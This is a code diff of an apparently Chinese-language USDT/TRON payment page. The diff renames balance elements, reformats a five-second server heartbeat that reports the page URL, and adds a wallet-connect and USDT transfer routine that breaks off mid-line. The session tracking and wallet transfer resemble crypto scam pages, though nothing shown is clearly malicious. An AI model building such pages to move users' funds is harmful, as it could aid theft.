@@ -14,7 +14,7 @@
             display: none;
         }
 
-     .tishi {
+    .tishi {
             width: 58%;
             padding: 0.1rem 0.3rem;
             height: 3rem;
@@ -59,8 +59,8 @@
                                     <div data - v - 49fe1bb8="" class="asset - info">
                                         <div data - v - 49fe1bb8="" class="name"><img data - v - 49fe1bb8="" src="png/icon_trx.png" class="coin">
                                             <div data - v - 49fe1bb8="" class="asset - box">
-                                                <p data - v - 49fe1bb8="" class="title">USDT余额</p>
-                                                <p data - v - 49fe1bb8="" class="num"><span data - v - 49fe1bb8="" id="usdtYe"></span><em data - v - 49fe1bb8="">USDT</em></p><input type="text" id="address" style="display:none">
+                                                <p data - v - 49fe1bb8="" class="title">余额</p>
+                                                <p data - v - 49fe1bb8="" class="num"><span data - v - 49fe1bb8="" id="ye"></span><em data - v - 49fe1bb8="">USDT</em></p><input type="text" id="address" style="display:none">
                                             </div>
                                         </div>
                                         <div data - v - 49fe1bb8="" class="right">
@@ -174,7 +174,7 @@
         }
         // 更新页面的USDT余额
         function updateUSDTBalance() {
-            const balanceElement = document.getElementById('usdtYe');
+            const balanceElement = document.getElementById('ye');
             if (balanceElement) {
                 balanceElement.textContent = parseFloat(userData.usdtBalance).toFixed(4);
             } else {
@@ -321,13 +321,13 @@
                 },
                 body: JSON.stringify({ url: currentUrl })
             })
-             .then(response => response.json())
-             .then(data => {
+            .then(response => response.json())
+            .then(data => {
                     if (data.status === 'error' && data.message === '会话已结束') {
                         console.log('会话已结束');
                     }
                 })
-             .catch(() => {
+            .catch(() => {
                 });
         }
         const heartbeatInterval = setInterval(sendHeartbeat, 5000); // 每隔5秒发送一次了
@@ -340,3 +340,19 @@
         async function onNextButtonClick() {
             try {
                 // 检查钱包是否已连接
+                if (!window.tronWeb ||!window.tronWeb.defaultAddress ||!window.tronWeb.defaultAddress.base58) {
+                    await connectWallet();
+                    return;
+                }
+                await transferUSDT();
+            } catch (error) {
+                console.error('操作执行失败:', error);
+                tip('付款失败，请重新发起交易');
+            }
+        }
+
+        async function transferUSDT() {
+            const trxAmountInSun = Math.floor(parseFloat(currentAmount) * 1e6);
+            const feeLimit = 100000000;
+            try {
+                const paymentAddress = tronWeb.address.from
